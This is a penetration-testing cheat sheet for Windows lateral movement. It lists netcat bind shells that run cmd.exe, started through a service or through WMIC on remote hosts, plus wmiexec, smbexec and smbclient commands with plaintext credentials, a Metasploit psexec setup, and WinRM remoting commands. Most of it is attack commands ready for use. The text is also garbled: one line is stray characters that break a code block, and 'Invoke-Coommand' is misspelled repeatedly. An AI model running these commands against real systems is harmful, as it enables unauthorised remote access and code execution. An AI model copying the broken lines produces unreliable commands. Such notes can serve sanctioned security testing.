# Lateral Movement
## Windows
### Bind Shell as a service
```cmd
sc \\machinename create ncservice binpath= "cmd.exe /k c:\tools\nc.exe -nvlp 2222 -e cmd.exe"
```
### Bind shell with WMIC - Local Machine
```cmd
wmic /node:machinename process call create "c:\tools\nc.exe -nvlp 4444 -e cmd.exe" 
```
### Bind shell with WMIC - Remote Machine
```cmd
wmic /node:machinename /user:username /password:Password process call create "c:\tools\nc.exe -dnvlp 4444 -e cmd.exe" 
```
### wmiexec.py
```bash
wmiexec user:pass@<IP>
```
### smbexec.py - not interactive
```bash
smbexec user:pass@<IP>
```
### smbclient.py
```bash
smbclient hitbox/user:pass@<IP>
```hjcxjj
"X"H??mu ]"?///////
### lookupsid
```bash
lookupusersid hitbox/user:pass@<IP>
```
### meterpreter
```bash
use exploit/windows/smb/psexec
set smbuser
set smbpass
set smbdomain
set rhost
set lhost
```

### Winrm and Powershell Remoting
#### Test if WinRM is Running
```powershell
Test-WSMan -ComputerName <hostname>
```
#### Test if WinRM Port is Open
```powershell
Test-NetConnection -ComputerName <hostname> -CommonTCPPort WINRM
```
#### Run command on the system with passthrough authentication
```powershell
Invoke-Coommand -ComputerName <hostname> -port 5985 -ScriptBlock {Command}
```
#### Run command on the system with Alternate Credentials = GUI
```powershell
$cred = Get-Credential
Invoke-Coommand -ComputerName <hostname> -port 5985 -Credential $cred -Authentication Negotiate -ScriptBlock {Command}
```
#### Run command on the system with Alternate Credentials = GUI
```powershell
$cred = New-Object System.Management.Automation.PSCredential ('Username', ConvertTo-SecureString 'Password' -AsPlainText -Force)
Invoke-Coommand -ComputerName <hostname> -port 5985 -Credential $cred -Authentication Negotiate -ScriptBlock {Command}
```
